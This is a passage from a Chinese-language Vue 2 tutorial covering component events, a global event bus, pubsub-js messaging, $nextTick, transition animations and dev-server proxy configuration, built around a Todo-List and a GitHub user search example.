  		methods: {
  			//清空所有已完成
  			clearAll(){
  				// this.clearAllTodo()
  				this.$emit('clearAllTodo')
  			}
  		},
  	}
  </script>
  ~~~

### 4. ==组件之间传递数据总结==

第一种组件间通信的方式，适用于：子组件===>父组件

1. 使用场景: A是父组件，B是子组件, B想给A传数据，那么就要在A中给B绑定自定义事件(事件的回调在A中)。

2. 绑定自定义事件:

   - 第一种方式，在父组件中：`<Demo @atguigu="test"/> 或<Demo v-on:atguigu="test"/>`

   - 第二种方式，在父组件中:

     ~~~vue
     <Demo ref="demo"/>
     mounted(){
     	this.$refs.xxx.$on('atguigu',this.test)
     }
     ~~~

   - 若想让自定义事件只能触发一次，可以使用once修饰符,或`$once方法`。

3. 触发自定义事件: `this. $emit( ' atguigu'，数据)`

4. 解绑自定义事件`this. $off(' atguigu')`

5. 组件上也可以绑定原生DOM事件，需要使用`native`修饰符。

6. 注意:通过`this.$refs.xxx.$on('atguigu',回调)`绑定自定义事件时，回调要么配置在methods中,要么用箭头函数,否则this指 向会出问题

第二种组件间的通信方式，适用于：父组件====>子组件

1. 使用场景: A是父组件，B是子组件, A想给B传数据，那么就要在A中给B标签绑定数据。在B中用`props`配置参数接收。

2. 使用方法：

   ~~~html
   <!--App组件中-->
   <App>
   	<Student name='li' :age='18'/>
   </App>
   <!--Student组件中-->
   <Student>
   	export default {props:['name','age']}
   </Student>
   ~~~

3. 此时子组件中就可以使用父组件传递过来的数据

## 十九. 全局事件总线

> 可以实现任意组件间的通信。基于一个消息中心，订阅和发布消息的模式,在`Vue`中可以使用 `EventBus` 来作为沟通桥梁的概念，就像是所有组件共用相同的事件中心，可以向该中心注册发送事件或接收事件
>
> 此时我们就需要一个代理(全局总线)，这个代理能做两件事：既能让所有组件都能看到自己(调用自己的方法)，还有`$on`、`$off`和`$emit`方法。

[Vue全局事件代理原理：](https://s1.ax1x.com/2022/05/07/Olcgcq.png)

​				[<img src="https://s1.ax1x.com/2022/05/07/Olcgcq.png" alt="Olcgcq.png" style="zoom:50%;" />](https://imgtu.com/i/Olcgcq)

### 1. 配置全局总线

> 我们要想让全部组件都能看到这个代理，常用的做法是将其放在Vue的原型对象prototype上

~~~JavaScript
new Vue({
    beforeCreate() {
        Vue.prototype.$bus = this //安装全局事件总线，$bus就是当前应用的vm
    },
})
~~~

### 2. 使用事件总线

> 接收数据: A组件想接收数据，则在A组件中给`$bus`绑定自定义事件，事件的回调留在A组件自身。这个`$bus`是我们定义的规范，可以换为别的。最后最好在beforeDestroy钩子中，用$off去解绑当前组件所用到的事件。

~~~JavaScript
methods( ){
    demo(data){.....}
}
mounted() {
    this.$bus.$on('xxxx',this.demo)
}
~~~

提供数据：`this.$bus.$emit('xxx',数据)`

### 3. 使用全局事件总线

> ==谁想用父组件或兄弟组件数据就在谁身上绑定`this.$bus.$on("函数名",回调) `==

- 先在mian.js中安装全局事件总线

  ~~~JavaScript
  import Vue from 'vue'
  import App from './App.vue'
  
  Vue.config.productionTip = false
  
  new Vue({
      el:'#app',
      render: h => h(App),
      beforeCreate() {
          Vue.prototype.$bus = this // 安装全局事件总线
      }
  })
  ~~~

  > 这里的this就是Vue示例对象本身

- 在App.vue中注册组件

  ~~~vue
  <template>
  <div class="app">
      <School/>
      <Student/>
      </div>
  </template>
  
  <script>
      import Student from './components/Student'
      import School from './components/School'
  
      export default {
          name:'App',
          components:{School, Student}
      }
  </script>
  
  <style scoped>.app{background-color: gray;padding: 5px;}</style>
  ~~~

- 编写School.vue组件获取Student.vue传递过来的数据

  ~~~vue
  <template>
  <div class="school">
      <h2>学校名称：{{ name }}</h2>
      <h2>学校地址：{{ address }}</h2>
      </div>
  </template>
  
  <script>
      export default {
          name: "School",
          data() {
              return {
                  name: "尚硅谷",
                  address: "北京",
              };
          },
          mounted() {  
              // console.log('School',this)
              this.$bus.$on("hello", (data) => {
                  console.log("我是School组件，收到了数据", data);
              });
          },
          beforeDestroy() {  
              this.$bus.$off("hello");
          },
      };
  </script>
  
  <style scoped>.school {background-color: skyblue;padding: 5px;}</style>
  ~~~

- 编写Student.vue组件给School.vue发送消息

  ~~~vue
  <template>
  <div class="student">
      <h2>学生姓名：{{ name }}</h2>
      <h2>学生性别：{{ sex }}</h2>
      <button @click="sendStudentName">把学生名给School组件</button> 
      </div>
  </template>
  
  <script>
      export default {
          name:'Student',
          data() {
              return {
                  name:'张三',
                  sex:'男'
              }
          },
          methods: {  
              sendStudentName(){
                  this.$bus.$emit('hello',this.name)
              }
          }
      }
  </script>
  
  <style scoped>.student{background-color: pink;padding: 5px;margin-top: 30px;}</style>
  ~~~

[Vue全局总线运行结果：](https://s1.ax1x.com/2022/05/07/Ol2gmV.png)

​														[<img src="https://s1.ax1x.com/2022/05/07/Ol2gmV.png" alt="Ol2gmV.png" style="zoom:50%;" />](https://imgtu.com/i/Ol2gmV)

### 4. 优化Todo-List案例

> 我们在MyItem.vue文件中使用的事件是由App.vue`===>`MyList.vue`===>`MyItem.vue的方式进行的，我们在这里可以优化以下，使用全局总线优化代码

- main.js文件注册全局总线

  ~~~JavaScript
  import Vue from 'vue'
  import App from './App.vue'
  Vue.config.productionTip = false
  
  new Vue({
      el:'#app',
      render: h => h(App),
      beforeCreate() {
          Vue.prototype.$bus = this
      },
  })
  ~~~

- App.vue文件删除之前通过MyList.vue向MyItem.vue传递的事件，之后挂载两个事件`checkTodo`和`deleteTodo`

  ~~~vue
  <template>
    <div id="root">
      <div class="todo-container">
        <div class="todo-wrap">
          <MyHeader @addTodo="addTodo" />
          <MyList :todos="todos"/>
          <MyFooter :todos="todos" @checkAllTodo="checkAllTodo" @clearAllTodo="clearAllTodo"/>
      </div>
      </div>
    </div>
  </template>
  
  <script>
    import MyHeader from "./components/MyHeader";
    import MyList from "./components/MyList";
    import MyFooter from "./components/MyFooter.vue";
  
    export default {
      name: "App",
      components: { MyHeader, MyList, MyFooter },
      data() {
        return {
          //由于todos是MyHeader组件和MyFooter组件都在使用，所以放在App中（状态提升）
          todos: JSON.parse(localStorage.getItem("todos")) || [],
        };
      },
      methods: {
        //添加一个todo
        addTodo(todoObj) {
          this.todos.unshift(todoObj);
        },
        //勾选or取消勾选一个todo
        checkTodo(id) {
          this.todos.forEach((todo) => {
            if (todo.id === id) todo.done = !todo.done;
          });
        },
        //删除一个todo
        deleteTodo(id) {
          this.todos = this.todos.filter((todo) => todo.id !== id);
        },
        //全选or取消全选
        checkAllTodo(done) {
          this.todos.forEach((todo) => {
            todo.done = done;
          });
        },
        //清除所有已经完成的todo
        clearAllTodo() {
          this.todos = this.todos.filter((todo) => {
            return !todo.done;
          });
        },
      },
      watch: {
        todos: {
          deep: true,
          handler(value) {
            localStorage.setItem("todos", JSON.stringify(value));
          },
        },
      },
      mounted() {
        this.$bus.$on("checkTodo", this.checkTodo);
        this.$bus.$on("deleteTodo", this.deleteTodo);
      },
      beforeDestroy() {
        this.$bus.$off("checkTodo");
        this.$bus.$off("deleteTodo");
      },
    };
  </script>
  ~~~

- 在MyItem.vue中设置响应触发事件

  ~~~vue
  <template>
  <li>
      <label>
          <input type="checkbox" :checked="todoObj.done" @change="handleCheck(todoObj.id)"/>
          <span>{{ todoObj.title }}</span>
      </label>
      <button class="btn btn-danger" @click="handleDelete(todoObj.id)">删除</button>
      </li>
  </template>
  
  <script>
      export default {
          name: "MyItem",
          data() {
              return {};
          },
          props: ["todoObj"], // 声明接受todoObj对象
          methods: {
              handleCheck(id) {
                  this.$bus.$emit('checkTodo', id)
              },
              handleDelete(id) {
                  if (confirm('确定删除吗？')) {
                      this.$bus.$emit('deleteTodo', id)
                  }
              }
          },
      };
  </script>
  ~~~

## 二十. 消息的订阅与发布(不常用)

> 消息的订阅与发布是一种组件间的通信方式，适用于任意组件间的通信。	
>
> 使用步骤：
>
> 1. 安装pubsub：`nmp i pubsub-js`
> 2. 引入模块：`import pubsub from 'pubsub-js'`
> 3. 接收数据：A组件想接收数据，则在A组件中订阅消息，订阅的回调留在A组件自身

### 1. 订阅消息

> 导入模块的pubsub是一个对象，他有三个方法给用户调用。分别是：订阅消息，发布消息，取消消息订阅

订阅消息语法：

~~~JavaScript
this.pubId = pubsub.subscribe('订阅消息名',function(msgName,data){})
~~~

> 上面的pubId是为取消订阅而接受的对象ID。第二个参数是订阅消息的回调函数，第一个参数接收的是订阅的消息名，第二个参数接收的发布消息的是传递的数据。

### 2. 发布消息

~~~JavaScript
点击触发函数名字(){
pubsub. publish('要执行哪个订阅消息的名字','给订阅消息传递的订阅参数'){}
~~~

### 3. 取消消息订阅

~~~javascript
beforeDestroy() {
    pubsub.unsubscribe (this.pubId) 
}
~~~

> 因为这里涉及到跨作用域调用，所以要用到this接收订阅ID，再销毁。

### 4. 完整代码

- School.vue

  ~~~vue
  <template>
  <div class="school">
      <h2>学校名称：{{name}}</h2>
      <h2>学校地址：{{address}}</h2>
      </div>
  </template>
  
  <script>
      import pubsub from 'pubsub-js'
  
      export default {
          name: 'School',
          data() {
              return {
                  name:'尚硅谷',
                  address:'北京',
              }
          },
          methods: {
              demo(msgName, data) {
                  console.log('我是School组件，收到了数据：',msgName, data)
              }
          },
          mounted() {
              this.pubId = pubsub.subscribe('demo', this.demo) // 订阅消息
          },
          beforeDestroy() {
              pubsub.unsubscribe(this.pubId) // 取消订阅
          }
      }
  </script>
  
  <style scoped>
      .school{
          background-color: skyblue;
          padding: 5px;
      }
  </style>
  ~~~

- Student.vue

  ~~~vue
  <template>
  <div class="student">
      <h2>学生姓名：{{name}}</h2>
      <h2>学生性别：{{sex}}</h2>
      <button @click="sendStudentName">把学生名给School组件</button>
      </div>
  </template>
  
  <script>
      import pubsub from 'pubsub-js'
  
      export default {
          name:'Student',
          data() {
              return {
                  name:'JOJO',
                  sex:'男',
              }
          },
          methods: {
              sendStudentName(){
                  pubsub.publish('demo', this.name) // 发布消息
              }
          }
      }
  </script>
  
  <style scoped>
      .student{
          background-color: pink;
          padding: 5px;
          margin-top: 30px;
      }
  </style>
  ~~~

[Vue消息订阅运行结果：](https://s1.ax1x.com/2022/05/08/O17weH.png)

​											[<img src="https://s1.ax1x.com/2022/05/08/O17weH.png" alt="O17weH.png" style="zoom: 33%;" />](https://imgtu.com/i/O17weH)

### 5. 使用消息订阅与发布优化案例

> 这里用消息对Todos-List案例进行修改

- 在App.vue

  ~~~vue
  <template>
  <div id="root">
      <div class="todo-container">
          <div class="todo-wrap">
              <MyHeader @addTodo="addTodo"/>
              <MyList :todos="todos"/>
              <MyFooter :todos="todos" @checkAllTodo="checkAllTodo" @clearAllTodo="clearAllTodo"/>
      </div>
      </div>
      </div>
  </template>
  
  <script>
      import pubsub from 'pubsub-js'	// 习惯第三方库写上面
      import MyHeader from './components/MyHeader.vue'
      import MyList from './components/MyList.vue'
      import MyFooter from './components/MyFooter.vue'
  
  
      export default {
          name:'App',
          components: { MyHeader,MyList,MyFooter },
          data() {
              return {
                  todos:JSON.parse(localStorage.getItem('todos')) || []
              }
          },
          methods:{
              //添加一个todo
              addTodo(todoObj){
                  this.todos.unshift(todoObj)
              },
              //勾选or取消勾选一个todo
              checkTodo(_,id){
                  this.todos.forEach((todo)=>{
                      if(todo.id === id) todo.done = !todo.done
                  })
              },
              //删除一个todo
              deleteTodo(id){
                  this.todos = this.todos.filter(todo => todo.id !== id)
              },
              //全选or取消勾选
              checkAllTodo(done){
                  this.todos.forEach(todo => todo.done = done)
              },
              //删除已完成的todo
              clearAllTodo(){
                  this.todos = this.todos.filter(todo => !todo.done)
              }
          },
          watch:{
              todos:{
                  deep:true,
                  handler(value){
                      localStorage.setItem('todos',JSON.stringify(value))
                  }
              }
          },
          mounted(){
              this.pubId = pubsub.subscribe('checkTodo',this.checkTodo)	// 两种对比
              this.$bus.$on('deleteTodo',this.deleteTodo)
          },
          beforeDestroy(){
              pubsub.unsubscribe(this.pubId)
              this.$bus.$off('deleteTodo')
          }
      }
  </script>
  
  <style>
      body {
          background: #fff;
      }
  
      .btn {
          display: inline-block;
          padding: 4px 12px;
          margin-bottom: 0;
          font-size: 14px;
          line-height: 20px;
          text-align: center;
          vertical-align: middle;
          cursor: pointer;
          box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2), 0 1px 2px rgba(0, 0, 0, 0.05);
          border-radius: 4px;
      }
  
      .btn-danger {
          color: #fff;
          background-color: #da4f49;
          border: 1px solid #bd362f;
      }
  
      .btn-danger:hover {
          color: #fff;
          background-color: #bd362f;
      }
  
      .btn:focus {
          outline: none;
      }
  
      .todo-container {
          width: 600px;
          margin: 0 auto;
      }
      .todo-container .todo-wrap {
          padding: 10px;
          border: 1px solid #ddd;
          border-radius: 5px;
      }
  </style>
  ~~~

- 修改MyItem.vue

  ~~~vue
  <template>
  <li>
      <label>
          <input type="checkbox" :checked="todo.done" @click="handleCheck(todo.id)"/>
          <span>{{todo.title}}</span>
      </label>
      <button class="btn btn-danger" @click="handleDelete(todo.id,todo.title)">删除</button>
      </li>
  </template>
  
  <script>
      import pubsub from 'pubsub-js'
      export default {
          name:'MyItem',
          props:['todo'],
          methods:{
              handleCheck(id){                    
                  pubsub.publish('checkTodo',id)
              },
              handleDelete(id,title){
                  if(confirm("确定删除任务："+title+"吗？")){
                      this.$bus.$emit('deleteTodo',id)
                  }
              }
          }
      }
  </script>
  
  <style scoped>
      li {
          list-style: none;
          height: 36px;
          line-height: 36px;
          padding: 0 5px;
          border-bottom: 1px solid #ddd;
      }
  
      li label {
          float: left;
          cursor: pointer;
      }
  
      li label li input {
          vertical-align: middle;
          margin-right: 6px;
          position: relative;
          top: -1px;
      }
  
      li button {
          float: right;
          display: none;
          margin-top: 3px;
      }
  
      li:before {
          content: initial;
      }
  
      li:last-child {
          border-bottom: none;
      }
  
      li:hover {
          background-color: #eee;
      }
  
      li:hover button{
          display: block;
      }
  </style>
  ~~~

### 6. $nextTick

> 这是一个生命周期钩子。`this.$nextTick(回调函数)`在下一次DOM更新结束后执行其指定的回调
>
> 用处：
>
> 当改变数据后，要基于更新后的新DOM进行操作时，要在nextTick所指定的回调函数中执行。

- 优化Todo-List案例

  > 我们在之前一条条事件框后新添加一个功能，来实现自定义编辑事件的功能。

  MyItem.vue

  ~~~vue
  <template>
  <li>
      <label>
          <input type="checkbox" :checked="todo.done" @change="handleCheck(todo.id)"/>
          <span v-show="!todo.isEdit">{{ todo.title }}</span>
          <input type="text" v-show="todo.isEdit" :value="todo.title"
                 @blur="handleBlur(todo, $event)" ref="inputTitle"/>
      </label>
      <button class="btn btn-danger" @click="handleDelete(todo.id)">删除</button>
      <button v-show="!todo.isEdit" class="btn btn-edit" @click="handleEdit(todo)">
          编辑
      </button>
      </li>
  </template>
  
  <script>
      export default {
          name: "MyItem",
  
          props: ["todo"],	// 声明接收todo
          methods: {
              handleCheck(id) {		// 勾选or取消勾选
                  // 通知App组件将对应的todo对象的done值取反
                  // this.checkTodo(id)
                  this.$bus.$emit("checkTodo", id);
              },
              handleDelete(id) {	// 删除
                  if (confirm("确定删除吗？")) {
                      // 通知App组件将对应的todo对象删除
                      // this.deleteTodo(id)
                      this.$bus.$emit('deleteTodo',id)
                  }
              },
              handleEdit(todo) {	// 编辑
                  if (todo.hasOwnProperty("isEdit")) {
                      todo.isEdit = true;
                  } else {
                      this.$set(todo, "isEdit", true);
                  }
                  this.$nextTick(function () {
                      this.$refs.inputTitle.focus();
                  });
              },
              handleBlur(todo, e) {	// 失去焦点回调（真正执行修改逻辑）
                  todo.isEdit = false;
                  if (!e.target.value.trim()) return alert("输入不能为空！");
                  this.$bus.$emit("updateTodo", todo.id, e.target.value);
              },
          },
      };
  </script>
  ~~~

[添加完编辑后运行结果：](https://s1.ax1x.com/2022/05/08/O3FsSS.png)

​									[<img src="https://s1.ax1x.com/2022/05/08/O3FsSS.png" alt="O3FsSS.png" style="zoom:50%;" />](https://imgtu.com/i/O3FsSS)

## 二十一. 动画效果

> Vue的封装的过度与动画：在插入、更新或移除DOM元素时，在合适的时候就给元素添加对应的动画函数名。

[动画运行原理：](https://s1.ax1x.com/2022/05/09/OJaxr8.png)

​					[<img src="https://s1.ax1x.com/2022/05/09/OJaxr8.png" alt="OJaxr8.png" style="zoom: 33%;" />](https://imgtu.com/i/OJaxr8)

### 1. 动画写法

> 1. 在`<style>`标签中定义过渡动画
>    - 进入样式分为：进入的起点、进入过程中、进入的终点
>    - 离开样式分为：离开的起点、离开的过程中、离开的终点

进入样式具体写法如下：

|    进入样式    |     描述     |
| :------------: | :----------: |
|    v-enter     |  进入的起点  |
| v-enter-active | 进入的过程中 |
|   v-enter-to   |  进入的终点  |

离开样式具体写法如下：

|    离开样式    |     描述     |
| :------------: | :----------: |
|    v-leave     |  离开的起点  |
| v-leave-active | 离开的过程中 |
|   v-leave-to   |  离开的终点  |

> 2. 使用`<transition>`包裹要过度的元素，并配置`name`属性，此时需要将上面样式名的`v`转换为name中的值。
> 3. 如果想让页面一开始就显示动画，需要添加`appear`属性，为true表示一刷新就显示动画。

~~~vue
<transition name="hello" appear>
    <h1 v-show="isShow">你好啊！</h1>
</transition>

<script>
    export default {
        name: 'Test' ,
        data() {
            return{
                isShow:true
            },
        }
    }
</script>

<style>
    /*指定标签名为hello，所以要用.hello-enter-active*/
    .hello-enter-active{
        animation: hello 0.5s linear;
    }

    .hello-leave-active{
        animation: hello 0.5s linear reverse;
    }

    @keyframes hello {
        from{
            transform: translateX(-100%);
        }
        to{
            transform: translateX(0px);
        }
    }
</style>
~~~

如果有多个元素需要过度，则需要用到`<transition-group>`，且每个元素都要指定`key`值。	

~~~vue
<transition-group name="hello" appear>
    <h1 v-show="!isShow" key="1">你好啊！</h1>
    <h1 v-show="isShow" key="2">尚硅谷！</h1>
</transition-group>
~~~

### 2. 第三方动画库使用

> 可以到[nmp](https://www.npmjs.com/)官网寻找第三方库。这里推荐一个库：[animate.css](https://animate.style/)

- 先在端口中安装该包

  ~~~shell
  npm install animate.css --save
  ~~~

- 在`<script>`中导入包

  ~~~html
  <script>
  	import 'animate.css'
  </script>
  ~~~

- 在组件中使用类名`name="animate__animated animate__bounce"`配置

  > `enter-active-class`：配置入场动画
  >
  > `leave-active-class`：配置离场动画
  >
  > 后面值在官方元素后获取复制后即可使用

  ~~~vue
  <transition-group appear
                    name="animate__animated animate__bounce"
                    enter-active-class="animate__swing"
                    leave-active-class="animate__backOutUp">
      <h1 v-show="!isShow" key="1">你好啊！</h1>
      <h1 v-show="isShow" key="2">尚硅谷！</h1>
  </transition-group>
  ~~~

### 3. 完整案例演练

- 创建App.vue整合组件

  ~~~vue
  <template>
  <div>
      <Test1/>
      <Test2/>
      <Test3/>
      </div>
  </template>
  
  <script>
      import Test from './components/Test'
      import Test2 from './components/Test2'
      import Test3 from './components/Test3'
  
      export default {
          name:'App',
          components:{Test1,Test2,Test3},
      }
  </script>
  ~~~

- 创建test1.vue实现最简单的一个组件演示用于演示**动画效果**

  ~~~vue
  <template>
  <div>
      <button @click="isShow = !isShow">显示/隐藏</button>
      <transition name="hello" appear>
          <h1 v-show="isShow">你好啊！</h1>
      </transition>
      </div>
  </template>
  
  <script>
      export default {
          name: 'Test',
          data() {return {isShow:true}},
      }
  </script>
  
  <style scoped>
      h1{background-color: orange;}
  
      .hello-enter-active{
          animation: atguigu 0.5s linear;
      }
  
      .hello-leave-active{
          animation: atguigu 0.5s linear reverse;
      }
  
      @keyframes atguigu {
          from{transform: translateX(-100%);}
          to{transform: translateX(0px);}
      }
  </style>
  ~~~

  [运行结果：](https://s1.ax1x.com/2022/05/09/OJgUXj.png)

  ​                                        [<img src="https://s1.ax1x.com/2022/05/09/OJgUXj.png" alt="OJgUXj.png" style="zoom:50%;" />](https://imgtu.com/i/OJgUXj)

- 创建test2.vue用于演示多个元素过渡效果

  ~~~vue
  <template>
  <div>
      <button @click="isShow = !isShow">显示/隐藏</button>
      <transition-group name="hello" appear>
          <h1 v-show="!isShow" key="1">你好啊！</h1>
          <h1 v-show="isShow" key="2">尚硅谷！</h1>
      </transition-group>
      </div>
  </template>
  
  <script>
      export default {
          name:'Test',
          data() {return {isShow:true}},
      }
  </script>
  
  <style scoped>
      h1 {
          background-color: orange;
          /* transition: 0.5s linear; */
      }
      /* 进入的起点、离开的终点 */
      .hello-enter,.hello-leave-to {
          transform: translateX(-100%);
      }
      .hello-enter-active,.hello-leave-active{
          transition: 0.5s linear;
      }
      /* 进入的终点、离开的起点 */
      .hello-enter-to,.hello-leave {
          transform: translateX(0);
      }
  </style>
  ~~~

  [运行结果：](https://s1.ax1x.com/2022/05/09/OJgbge.png)

  ​                                                        [<img src="https://s1.ax1x.com/2022/05/09/OJgbge.png" alt="OJgbge.png" style="zoom:50%;" />](https://imgtu.com/i/OJgbge)

- 创建test3.vue展示第三方库使用

  ~~~vue
  <template>
  <div>
      <button @click="isShow = !isShow">显示/隐藏</button>
      <transition-group appear
                        name="animate__animated animate__bounce"
                        enter-active-class="animate__swing"
                        leave-active-class="animate__backOutUp">
          <h1 v-show="!isShow" key="1">你好啊！</h1>
          <h1 v-show="isShow" key="2">尚硅谷！</h1>
      </transition-group>
      </div>
  </template>
  
  <script>
      import "animate.css"
  
      export default {
          name: "Test",
          data() {return {isShow: true,}},
      };
  </script>
  
  <style scoped>
      h1 {background-color: orange;}
  </style>
  ~~~

  [运行结果：](https://s1.ax1x.com/2022/05/09/OJxR7q.png)

  ​                                           [<img src="https://s1.ax1x.com/2022/05/09/OJxR7q.png" alt="OJxR7q.png" style="zoom:50%;" />](https://imgtu.com/i/OJxR7q)

### 4. 使用动画效果优化Todo-List案例

> 优化方式有两种：一种是在MyItem.vue中给事件加`transition-group`标签
>
> 另一种是在MyList.vue中给`MyItem`添加动画标签

在MyList.vue给`MyItem`添加动画标签

~~~vue
<template>
<ul class="todo-main">
    <transition-group name="todo" appear>
        <MyItem v-for="todoObj of todoList" :key="todoObj.id" :todoObj="todoObj"/>
    </transition-group>
    </ul>
</template>

<script>
    import MyItem from "./MyItem.vue";

    export default {
        name: "MyList",
        components: { MyItem },
        props: ["todoList"],
    };
</script>

<style scoped>
    /*main*/
    .todo-main {margin-left: 0px;border: 1px solid #ddd;border-radius: 2px;padding: 0px;}
    .todo-empty {height: 40px;line-height: 40px;border: 1px solid #ddd;border-radius: 2px;
        padding-left: 5px;margin-top: 10px;}

    .todo-enter-active {
        animation: atguigu 0.5s linear;
    }

    .todo-leave-active {
        animation: atguigu 0.5s linear reverse;
    }

    @keyframes atguigu {
        from {
            transform: translateX(100%);
        }
        to {
            transform: translateX(0px);
        }
    }
</style>
~~~

## 二十二. 代理配置

> 代理配置是为了解决跨域问题：跨域问题是由于浏览器的同源政策，协议，端口，域名有一个不同就会造成跨域。比如说发送的异步请求是不同的两个源，就比如是不同的两个协议或者两个不同的域名或者不同的端口
>
> 同源策略就是浏览器保护浏览器安全的一种机制，不允许客户端请求从A服务器请求过来的页面往B服务器发送Ajax请求。两个页面地址中的协议，域名，端口号一致，则表示同源。
>
> **同源策略限制内容有**：
>
> ​    1.储存在浏览器中的数据，如localStroage，cookie和indexdDB不能通过脚本跨域访问
>
> ​    2.不能通过脚本操作不同域下的DOM
>
> ​    3.不能通过ajax请求不同域的数据

[同源策略原理：](https://s1.ax1x.com/2022/05/11/OdTUy9.png)

​					[<img src="https://s1.ax1x.com/2022/05/11/OdTUy9.png" alt="OdTUy9.png" style="zoom:33%;" />](https://imgtu.com/i/OdTUy9)

以下情况都属于跨域：

[同源策略引起的跨域问题：](https://s1.ax1x.com/2022/05/11/Od7nfO.png)

​									[<img src="https://s1.ax1x.com/2022/05/11/Od7nfO.png" alt="Od7nfO.png" style="zoom:25%;" />](https://imgtu.com/i/Od7nfO)

### 1. 使用配置代理解决跨域问题

> 本案例需要下载axios库`npm install axios`配置参考文档Vue-Cli devServer.proxy
> vue. config.js是一个可选的配置文件， 如果项目的(和package. json同级的) 根目录中存在这个文件，那么它会被@vue/cli-service 自动加载。你也可以使用package.json中的vue 字段， 但是注意这种写法需要你严格遵照JSON的格式来写。

- 方法一：在vue.config.js中添加如下配置

  ~~~JavaScript
  module.exports = {
      devServer:{
          proxy:"http://localhost:5000"
      }
  }
  ~~~

  说明：

  1. 优点：配置简单，请求资源时直接发给前端(8080)即可
  2. 缺点：不能配置多个代理，不能灵活控制请求是否走代理。(请求资源时，代理服务器会先在本地查找资源，再到远程去找)
  3. 工作方式：若按照上述配置代理，当请求了前端不存在的资源时，才会将请求会转发给服务器(优先匹配前端资源)

- 方法二：编写vue.config.js配置具体代理规则

  ~~~JavaScript
  module.exports = {
      devServer: {
          proxy: {
              '/api1': {								// 匹配所有以 '/api1'开头的请求路径
                  target: 'http://localhost:5000',	// 代理目标的基础路径
                  pathRewrite: {'^/api1':''},			// 代理往后端服务器的请求去掉 /api1 前缀
                  ws: true,							// WebSocket
                  changeOrigin: true,
  
              },
              '/api2': {
                  target: 'http://localhost:5001',
                  pathRewrite: {'^/api2': ''},
                  changeOrigin: true
              }
          }
      }
  }
  /*
     changeOrigin设置为true时，服务器收到的请求头中的host为：localhost:5000
     changeOrigin设置为false时，服务器收到的请求头中的host为：localhost:8080
     changeOrigin默认值为true
  */
  ~~~

  说明

  1. 优点：可以配置多个代理，且可以灵活的控制请求是否走代理
  2. 缺点：配置略微繁琐，请求资源时必须加前缀。如配置上面配置项，想访问5000端口下的student文件就要将`http://localhost:5000/students`改为`http://localhost:8080/api1/students`访问服务器即可。

### 2. 配置多个代理跨域访问服务器

- 配置vue.config.js文件配置代理

  ~~~JavaScript
  module.exports = {
      pages: {
          index: {
              entry: 'src/main.js',
          },
      },
      lintOnSave:false,
      // 开启代理服务器（方式一）
      // devServer: {
      //     proxy:'http://localhost:5000'
      // }
  
      //开启代理服务器（方式二）
      devServer: {
          proxy: {
              '/api1': {
                  target: 'http://localhost:5000',
                  pathRewrite:{'^/api1':''},
                  // ws: true, //用于支持websocket,默认值为true
                  // changeOrigin: true //用于控制请求头中的host值,默认值为true
              },
              '/api2': {
                  target: 'http://localhost:5001',
                  pathRewrite:{'^/api2':''},
              }
          }
      }
  }
  ~~~

- 编写App.vue文件用于获取学生和汽车信息

  ~~~vue
  <template>
  <div>
      <button @click="getStudents">获取学生信息</button>
      <button @click="getCars">获取汽车信息</button>
      </div>
  </template>
  
  <script>
      import axios from 'axios'
      export default {
          name:'App',
          methods: {
              getStudents() {
                  axios.get('http://localhost:8080/students').then(
                      response => {
                          console.log('请求成功了',response.data)
                      },
                      error => {
                          console.log('请求失败了',error.message)
                      }
                  )
              },
              getCars() {
                  axios.get('http://localhost:8080/demo/cars').then(
                      response => {
                          console.log('请求成功了',response.data)
                      },
                      error => {
                          console.log('请求失败了',error.message)
                      }
                  )
              }
          },
      }
  </script>
  ~~~

  [配置代理后运行结果：](https://s1.ax1x.com/2022/05/11/OdOq6U.png)

​                             [<img src="https://s1.ax1x.com/2022/05/11/OdOq6U.png" alt="OdOq6U.png" style="zoom: 50%;" />](https://imgtu.com/i/OdOq6U)

从运行结果来看，解决了跨域问题。

### 3. Github用户搜索案例

> 编写一个案例，输入搜索用户名，通过GitHub提供网络接口，远程跨域访问用户数据。

- index.html

  ~~~html
  <!DOCTYPE html>
  <html lang="">
      <head>
          <meta charset="UTF-8">
          <!-- 针对IE浏览器的特殊配置，含义是让IE浏览器以最高渲染级别渲染页面 -->
          <meta http-equiv="X-UA-Compatible" content="IE=edge">
          <!-- 开启移动端的理想端口 -->
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <!-- 配置页签图标 -->
          <link rel="icon" href="<%= BASE_URL %>favicon.ico">
        
          <!-- 引入bootstrap样式 -->
          <link rel="stylesheet" href="<%= BASE_URL %>css/bootstrap.css">
        
          <!-- 配置网页标题 -->
          <title><%= htmlWebpackPlugin.options.title %></title>
      </head>
      <body>
          <!-- 容器 -->
          <div id="app"></div>
      </body>
  </html>
  ~~~

- main.js

  ~~~javascript
  import Vue from 'vue'
  import App from './App.vue'
  
  Vue.config.productionTip = false
  
  new Vue({
      el:"#app",
      render: h => h(App),
      beforeCreate(){
          Vue.prototype.$bus = this
      }
  })
  ~~~

- App.vue

  ~~~vue
  <template>
  <div class="container">
      <Search/>
      <List/>
      </div>
  </template>
  
  <script>
      import Search from './components/Search.vue'
      import List from './components/List.vue'
  
      export default {
          name:'App',
          components:{ Search, List },
      }
  </script>
  ~~~

- Search.vue

  ~~~vue
  <template>
  <section class="jumbotron">
      <h3 class="jumbotron-heading">Search Github Users</h3>
      <div>
          <input type="text" placeholder="enter the name you search" v-model="keyWord"/>&nbsp;
          <button @click="searchUsers">Search</button>
      </div>
      </section>
  </template>
  
  <script>
      import axios from "axios";
      export default {
          name: "Search",
          data() {
              return {
                  keyWord: "",
              };
          },
          methods: {
              searchUsers() {
                  //请求前更新List的数据
                  this.$bus.$emit("updateListData", {
                      isLoading: true,
                      errMsg: "",
                      users: [],
                      isFirst: false,
                  });
                  axios.get(`https://api.github.com/search/users?q=${this.keyWord}`).then(
                      (response) => {
                          console.log("请求成功了");
                          this.$bus.$emit("updateListData", {	//请求成功后更新List的数据
                              isLoading: false,
                              errMsg: "",
                              users: response.data.items,
                          });
                      },
                      (error) => {
                          this.$bus.$emit("updateListData", {	//请求后更新List的数据
                              isLoading: false,
                              errMsg: error.message,
                              users: [],
                          });
                      }
                  );
              },
          },
      };
  </script>
  ~~~

- List.vue

  ~~~vue
  <template>
  <div class="row">
      <!-- 展示用户列表 -->
      <div v-show="info.users.length" class="card" 
           v-for="user in info.users" :key="user.login">
          <a :href="user.html_url" target="_blank">
              <img :src="user.avatar_url" style="width: 100px" />
      </a>
          <p class="card-text">{{ user.login }}</p>
      </div>
      <!-- 展示欢迎词 -->
      <h1 v-show="info.isFirst">欢迎使用！</h1>
      <!-- 展示加载中 -->
